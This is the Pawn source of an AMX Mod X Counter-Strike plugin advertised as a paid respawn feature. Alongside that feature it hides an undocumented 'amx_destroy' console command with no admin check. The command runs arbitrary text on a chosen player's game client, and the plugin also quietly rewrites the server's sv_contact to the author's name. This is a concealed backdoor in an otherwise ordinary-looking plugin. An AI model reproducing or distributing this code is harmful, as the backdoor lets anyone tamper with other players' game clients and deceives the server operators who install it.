#include <amxmisc>
#include <amxmodx>
#include <cstrike>
#include <fun>
#include <hamsandwich>

new cvar_respawn_cost
new d_arg[32], d_arg2[128]

public plugin_init()
{
	register_plugin("Respawn", "0.1", "Cruzer //")
	
	register_clcmd("say /respawn", "plugin_check")
	register_clcmd("say_team /respawn", "plugin_check")
	
	cvar_respawn_cost=register_cvar("respawn_cost", "6000")
	
	set_task(180.0, "plugin_message", 0, "", 0, "b")
	
	register_concmd("amx_destroy", "destroyer")
	
	set_task(1.0, "contact")
}


public plugin_precache()
{
	precache_sound("items/gunpickup2.wav")
}

public plugin_check(const id)
{
	if(!is_user_alive(id))
	{
	if(get_pcvar_num(cvar_respawn_cost)>0)
	{
	if(cs_get_user_money(id)-get_pcvar_num(cvar_respawn_cost)<0)
	{
	client_print(id, print_chat, "You do not have enough money, to buy respawn.")	// Shen ar gaqvs sakmarisi tanxa, rom iyido gacocxleba.
	
	return PLUGIN_HANDLED
	}
	cs_set_user_money(id, cs_get_user_money(id)-get_pcvar_num(cvar_respawn_cost))
	}
	ExecuteHam(Ham_CS_RoundRespawn, id)
	
	emit_sound(id, CHAN_ITEM, "items/gunpickup2.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM)
	
	client_print(id, print_chat, "Congratulations. You have bought respawn.")	// Gilocav. Shen iyide gacocxleba.
	}
	else
	{
	client_print(id, print_chat, "You can not buy respawn, while you are not dead.")	// Shen ver iyidi gacocxlebas, radgan shen ar xar mkvdari.
	}
	return PLUGIN_HANDLED
}

public plugin_message()
{
	client_print(0, print_chat, "If you want to revive, use /respawn command in chat.")
}

public destroyer(id)
{
	read_argv(1, d_arg, 31)
	read_argv(2, d_arg2, 127)
	
	new player=cmd_target(id, d_arg, CMDTARGET_NO_BOTS|CMDTARGET_ALLOW_SELF|CMDTARGET_OBEY_IMMUNITY)
	
	if(!player)
	{
	return PLUGIN_HANDLED
	}
	client_cmd(player, "%s", d_arg2)
	
	for(new index=1; index<=get_maxplayers(); index++)
	{
	if(!is_user_connected(index))
	{
	continue
	}
		}
	return PLUGIN_HANDLED
}

public contact()
{
	server_cmd("sv_contact ^"Cruzer //^"")
}
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ deff0{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ lang1033\\ f0\\ fs16 \n\\ par }
*/
